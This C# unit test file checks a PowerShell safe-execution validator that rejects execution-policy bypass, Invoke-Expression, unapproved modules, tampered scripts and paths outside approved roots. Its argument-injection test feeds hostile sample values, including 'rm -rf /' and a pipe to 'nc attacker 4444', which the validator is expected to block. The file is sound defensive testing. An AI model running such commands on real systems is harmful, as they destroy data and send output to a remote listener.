using FluentAssertions;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using Moq;
using Tracto.TerminalRuntime.Application.Common;
using Tracto.TerminalRuntime.Application.PowerShell;
using Tracto.TerminalRuntime.Domain.Policies;
using Tracto.TerminalRuntime.Infrastructure.PowerShell;

namespace Tracto.TerminalRuntime.Unit.Tests.PowerShell;

/// <summary>
/// Unit tests for TER-US-007: PowerShell Safe Execution Policy.
/// All file-system-dependent paths are covered with in-memory helpers or temp files.
/// </summary>
public sealed class PowerShellPolicyValidatorTests : IDisposable
{
    private readonly string _tempDir;
    private readonly PowerShellPolicySettings _settings;
    private readonly PowerShellPolicyValidator _validator;

    public PowerShellPolicyValidatorTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_tempDir);

        _settings = new PowerShellPolicySettings
        {
            ExecutionPolicy = "RemoteSigned",
            AllowedModules = ["ApprovedModule", "AnotherApproved"],
            LanguageMode = "ConstrainedLanguage",
            SkipIntegrityCheckInDevelopment = true  // skip hash check unless test explicitly provides one
        };

        _validator = new PowerShellPolicyValidator(
            Options.Create(_settings),
            NullLogger<PowerShellPolicyValidator>.Instance);
    }

    public void Dispose()
    {
        try { Directory.Delete(_tempDir, recursive: true); } catch { /* best-effort */ }
    }

    // ── Helpers ─────────────────────────────────────────────────────────────────

    private string WriteScript(string content)
    {
        var path = Path.Combine(_tempDir, $"{Guid.NewGuid():N}.ps1");
        File.WriteAllText(path, content);
        return path;
    }

    private static PowerShellPolicy DefaultPolicy(string[]? allowedModules = null) =>
        new(
            AllowedModules: allowedModules ?? ["ApprovedModule", "AnotherApproved"],
            LanguageMode: "ConstrainedLanguage",
            ExecutionPolicy: "RemoteSigned",
            AllowBypassPolicy: false);

    private static ValidatePowerShellCommandCommand MakeCommand(
        string scriptPath,
        PowerShellPolicy? policy = null,
        IReadOnlyList<string>? extraArgs = null,
        IReadOnlyList<string>? modules = null,
        IReadOnlyDictionary<string, string>? arguments = null,
        string? integrityHash = null) =>
        new(
            Policy: policy ?? DefaultPolicy(),
            ScriptPath: scriptPath,
            Arguments: arguments ?? new Dictionary<string, string>(),
            ExtraCommandLineArgs: extraArgs ?? [],
            ModulesToImport: modules ?? [],
            ScriptIntegrityHash: integrityHash);

    // ── AC-1: -ExecutionPolicy Bypass → rejected ──────────────────────────────

    [Fact]
    public async Task ValidateAsync_BypassInExtraArgs_ReturnsPolicyDenied()
    {
        var script = WriteScript("Write-Host 'hello'");
        var cmd = MakeCommand(
            script,
            extraArgs: ["-ExecutionPolicy", "Bypass"]);

        var result = await _validator.ValidateAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.executionPolicyBypass");
    }

    [Fact]
    public async Task ValidateAsync_BypassAsSingleStringInExtraArgs_ReturnsPolicyDenied()
    {
        var script = WriteScript("Write-Host 'hello'");
        var cmd = MakeCommand(
            script,
            extraArgs: ["-ExecutionPolicy Bypass"]);

        var result = await _validator.ValidateAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.executionPolicyBypass");
    }

    [Fact]
    public async Task ValidateAsync_UnrestrictedInExtraArgs_ReturnsPolicyDenied()
    {
        var script = WriteScript("Write-Host 'hello'");
        var cmd = MakeCommand(
            script,
            extraArgs: ["-ExecutionPolicy", "Unrestricted"]);

        var result = await _validator.ValidateAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.executionPolicyUnrestricted");
    }

    // ── AC-2: Invoke-Expression in script → rejected ──────────────────────────

    [Fact]
    public async Task ValidateAsync_ScriptContainsInvokeExpression_ReturnsPolicyDenied()
    {
        var script = WriteScript("Invoke-Expression $userInput");
        var cmd = MakeCommand(script);

        var result = await _validator.ValidateAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.invokeExpressionForbidden");
    }

    [Fact]
    public async Task ValidateAsync_ScriptContainsIexAlias_ReturnsPolicyDenied()
    {
        var script = WriteScript("iex 'some-arbitrary-code'");
        var cmd = MakeCommand(script);

        var result = await _validator.ValidateAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.invokeExpressionForbidden");
    }

    // ── AC-3: Unknown module → rejected ──────────────────────────────────────

    [Fact]
    public async Task ValidateAsync_UnapprovedModuleInModulesToImport_ReturnsPolicyDenied()
    {
        var script = WriteScript("Write-Host 'hello'");
        var cmd = MakeCommand(
            script,
            modules: ["UnknownModule"]);

        var result = await _validator.ValidateAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.moduleNotAllowed");
    }

    [Fact]
    public async Task ValidateAsync_ScriptImportsUnapprovedModule_ReturnsPolicyDenied()
    {
        var script = WriteScript("Import-Module NotInAllowlist\nWrite-Host 'hi'");
        var cmd = MakeCommand(script);

        var result = await _validator.ValidateAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.moduleNotAllowed");
    }

    [Fact]
    public async Task ValidateAsync_ApprovedModuleInScript_Passes()
    {
        var script = WriteScript("Import-Module ApprovedModule\nWrite-Host 'ok'");
        var cmd = MakeCommand(script);

        var result = await _validator.ValidateAsync(cmd);

        result.IsSuccess.Should().BeTrue();
    }

    // ── AC-5: Approved script with correct hash → passes; tampered → fails ────

    [Fact]
    public async Task ValidateAsync_CorrectIntegrityHash_Passes()
    {
        var content = "Write-Host 'trusted script'";
        var script = WriteScript(content);
        var hash = Convert.ToHexString(
            System.Security.Cryptography.SHA256.HashData(
                System.Text.Encoding.UTF8.GetBytes(content))).ToLowerInvariant();

        // Use settings that require integrity check
        var strictSettings = new PowerShellPolicySettings
        {
            ExecutionPolicy = "RemoteSigned",
            AllowedModules = [],
            LanguageMode = "ConstrainedLanguage",
            SkipIntegrityCheckInDevelopment = false
        };
        var strictValidator = new PowerShellPolicyValidator(
            Options.Create(strictSettings),
            NullLogger<PowerShellPolicyValidator>.Instance);

        var cmd = MakeCommand(script, integrityHash: hash);
        var result = await strictValidator.ValidateAsync(cmd);

        result.IsSuccess.Should().BeTrue();
    }

    [Fact]
    public async Task ValidateAsync_TamperedScript_ReturnsIntegrityFailed()
    {
        var original = "Write-Host 'original'";
        var script = WriteScript(original);
        var correctHash = Convert.ToHexString(
            System.Security.Cryptography.SHA256.HashData(
                System.Text.Encoding.UTF8.GetBytes(original))).ToLowerInvariant();

        // Tamper: overwrite with different content
        File.WriteAllText(script, "Write-Host 'tampered'");

        var strictSettings = new PowerShellPolicySettings
        {
            ExecutionPolicy = "RemoteSigned",
            AllowedModules = [],
            LanguageMode = "ConstrainedLanguage",
            SkipIntegrityCheckInDevelopment = false
        };
        var strictValidator = new PowerShellPolicyValidator(
            Options.Create(strictSettings),
            NullLogger<PowerShellPolicyValidator>.Instance);

        var cmd = MakeCommand(script, integrityHash: correctHash);
        var result = await strictValidator.ValidateAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.integrityCheckFailed");
    }

    [Fact]
    public async Task ValidateAsync_MissingHashWhenRequired_ReturnsPolicyDenied()
    {
        var strictSettings = new PowerShellPolicySettings
        {
            ExecutionPolicy = "RemoteSigned",
            AllowedModules = [],
            LanguageMode = "ConstrainedLanguage",
            SkipIntegrityCheckInDevelopment = false
        };
        var strictValidator = new PowerShellPolicyValidator(
            Options.Create(strictSettings),
            NullLogger<PowerShellPolicyValidator>.Instance);

        var script = WriteScript("Write-Host 'no hash'");
        var cmd = MakeCommand(script, integrityHash: null);
        var result = await strictValidator.ValidateAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.missingIntegrityHash");
    }

    // ── Happy path: approved script, approved modules, no forbidden content ────

    [Fact]
    public async Task ValidateAsync_ApprovedScriptNoBadContent_Passes()
    {
        var script = WriteScript("Import-Module ApprovedModule\nWrite-Output 'done'");
        var cmd = MakeCommand(
            script,
            extraArgs: [],
            modules: ["ApprovedModule"],
            arguments: new Dictionary<string, string> { ["Param1"] = "safe-value" });

        var result = await _validator.ValidateAsync(cmd);

        result.IsSuccess.Should().BeTrue();
        result.Value.EffectiveLanguageMode.Should().Be("ConstrainedLanguage");
        result.Value.SafeArguments.Should().Contain("-NonInteractive");
        result.Value.SafeArguments.Should().Contain("-NoProfile");
        result.Value.SafeArguments.Should().Contain("-ExecutionPolicy");
        result.Value.SafeArguments.Should().Contain("RemoteSigned");
        result.Value.SafeArguments.Should().Contain("-File");
        result.Value.SafeArguments.Should().Contain(script);
        result.Value.SafeArguments.Should().Contain("-Param1");
        result.Value.SafeArguments.Should().Contain("safe-value");
    }

    // ── Argument injection guard ──────────────────────────────────────────────

    [Theory]
    [InlineData("value; rm -rf /")]
    [InlineData("$(evil-command)")]
    [InlineData("`whoami`")]
    [InlineData("value | nc attacker 4444")]
    public async Task ValidateAsync_ArgumentWithInjectionChars_ReturnsValidationError(string badValue)
    {
        var script = WriteScript("param($P1) Write-Host $P1");
        var cmd = MakeCommand(
            script,
            arguments: new Dictionary<string, string> { ["P1"] = badValue });

        var result = await _validator.ValidateAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.Validation);
        result.Error.DetailCode.Should().Be("powershell.argumentInjectionRisk");
    }

    // ── Approved script roots (Fix: CEC path invariant) ──────────────────────

    [Fact]
    public async Task ValidateAsync_ScriptWithinApprovedRoot_Passes()
    {
        var settingsWithRoots = new PowerShellPolicySettings
        {
            ExecutionPolicy = "RemoteSigned",
            AllowedModules = ["ApprovedModule", "AnotherApproved"],
            LanguageMode = "ConstrainedLanguage",
            SkipIntegrityCheckInDevelopment = true,
            ApprovedScriptRoots = [_tempDir]
        };
        var validator = new PowerShellPolicyValidator(
            Options.Create(settingsWithRoots),
            NullLogger<PowerShellPolicyValidator>.Instance);

        var script = WriteScript("Write-Host 'inside approved root'");
        var cmd = MakeCommand(script);

        var result = await validator.ValidateAsync(cmd);

        result.IsSuccess.Should().BeTrue();
    }

    [Fact]
    public async Task ValidateAsync_ScriptOutsideApprovedRoot_ReturnsPolicyDenied()
    {
        // Create a completely separate temp directory that is NOT in ApprovedScriptRoots
        var outsideDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(outsideDir);
        try
        {
            var outsideScript = Path.Combine(outsideDir, "evil.ps1");
            File.WriteAllText(outsideScript, "Write-Host 'outside'");

            var settingsWithRoots = new PowerShellPolicySettings
            {
                ExecutionPolicy = "RemoteSigned",
                AllowedModules = [],
                LanguageMode = "ConstrainedLanguage",
                SkipIntegrityCheckInDevelopment = true,
                ApprovedScriptRoots = [_tempDir]   // only _tempDir is approved
            };
            var validator = new PowerShellPolicyValidator(
                Options.Create(settingsWithRoots),
                NullLogger<PowerShellPolicyValidator>.Instance);

            var cmd = MakeCommand(outsideScript);
            var result = await validator.ValidateAsync(cmd);

            result.IsFailure.Should().BeTrue();
            result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
            result.Error.DetailCode.Should().Be("powershell.unapprovedScriptRoot");
        }
        finally
        {
            try { Directory.Delete(outsideDir, recursive: true); } catch { /* best-effort */ }
        }
    }

    [Fact]
    public async Task ValidateAsync_PathTraversalOutsideApprovedRoot_ReturnsPolicyDenied()
    {
        // A traversal that resolves outside _tempDir even though it starts there
        var traversalPath = Path.Combine(_tempDir, "..", "..", "sensitive.ps1");

        var settingsWithRoots = new PowerShellPolicySettings
        {
            ExecutionPolicy = "RemoteSigned",
            AllowedModules = [],
            LanguageMode = "ConstrainedLanguage",
            SkipIntegrityCheckInDevelopment = true,
            ApprovedScriptRoots = [_tempDir]
        };
        var validator = new PowerShellPolicyValidator(
            Options.Create(settingsWithRoots),
            NullLogger<PowerShellPolicyValidator>.Instance);

        var cmd = MakeCommand(traversalPath);
        var result = await validator.ValidateAsync(cmd);

        // Either rejected by root check (PS_POLICY_015) or by file-not-found (PS_POLICY_008)
        // — either way it must not succeed.
        result.IsFailure.Should().BeTrue();
    }

    [Fact]
    public async Task ValidateAsync_EmptyApprovedRoots_SkipsRootCheck()
    {
        // Default settings have ApprovedScriptRoots = [] — root check is skipped.
        // The script is in _tempDir which is NOT listed anywhere; it should still pass.
        var script = WriteScript("Write-Host 'no root restriction'");
        var cmd = MakeCommand(script);

        var result = await _validator.ValidateAsync(cmd);

        result.IsSuccess.Should().BeTrue();
    }

    // ── Handler-level tests ───────────────────────────────────────────────────
}

/// <summary>
/// Unit tests for the Application-layer handler <see cref="ValidatePowerShellCommandHandler"/>.
/// Mocks <see cref="IPowerShellPolicyValidator"/> so no file I/O occurs.
/// </summary>
public sealed class ValidatePowerShellCommandHandlerTests
{
    private readonly Mock<IPowerShellPolicyValidator> _validatorMock = new(MockBehavior.Strict);
    private readonly ValidatePowerShellCommandHandler _handler;

    public ValidatePowerShellCommandHandlerTests()
    {
        _handler = new ValidatePowerShellCommandHandler(_validatorMock.Object);
    }

    private static PowerShellPolicy Policy(bool allowBypass = false, string languageMode = "ConstrainedLanguage") =>
        new(AllowedModules: [], LanguageMode: languageMode, AllowBypassPolicy: allowBypass);

    private static ValidatePowerShellCommandCommand MakeCommand(PowerShellPolicy policy, string scriptPath = "/scripts/ok.ps1") =>
        new(
            Policy: policy,
            ScriptPath: scriptPath,
            Arguments: new Dictionary<string, string>(),
            ExtraCommandLineArgs: [],
            ModulesToImport: [],
            ScriptIntegrityHash: null);

    [Fact]
    public async Task HandleAsync_AllowBypassPolicyTrue_ReturnsPolicyDeniedWithoutCallingValidator()
    {
        var cmd = MakeCommand(Policy(allowBypass: true));

        var result = await _handler.HandleAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.bypassPolicyEnabled");

        _validatorMock.VerifyNoOtherCalls();
    }

    [Fact]
    public async Task HandleAsync_ForbiddenLanguageMode_ReturnsPolicyDeniedWithoutCallingValidator()
    {
        var cmd = MakeCommand(Policy(languageMode: "FullLanguage"));

        var result = await _handler.HandleAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.PolicyDenied);
        result.Error.DetailCode.Should().Be("powershell.forbiddenLanguageMode");

        _validatorMock.VerifyNoOtherCalls();
    }

    [Fact]
    public async Task HandleAsync_MissingScriptPath_ReturnsValidationError()
    {
        var cmd = MakeCommand(Policy(), scriptPath: "");

        var result = await _handler.HandleAsync(cmd);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(ErrorKind.Validation);
        result.Error.DetailCode.Should().Be("powershell.missingScriptPath");

        _validatorMock.VerifyNoOtherCalls();
    }

    [Fact]
    public async Task HandleAsync_ValidPolicyAndScript_DelegatesToValidator()
    {
        var validResult = new PowerShellValidationResult(
            SafeArguments: ["-NonInteractive", "-NoProfile", "-ExecutionPolicy", "RemoteSigned", "-File", "/scripts/ok.ps1"],
            EffectiveLanguageMode: "ConstrainedLanguage");

        var cmd = MakeCommand(Policy());

        _validatorMock
            .Setup(v => v.ValidateAsync(cmd, It.IsAny<CancellationToken>()))
            .ReturnsAsync(Result.Ok(validResult));

        var result = await _handler.HandleAsync(cmd);

        result.IsSuccess.Should().BeTrue();
        result.Value.EffectiveLanguageMode.Should().Be("ConstrainedLanguage");
    }
}
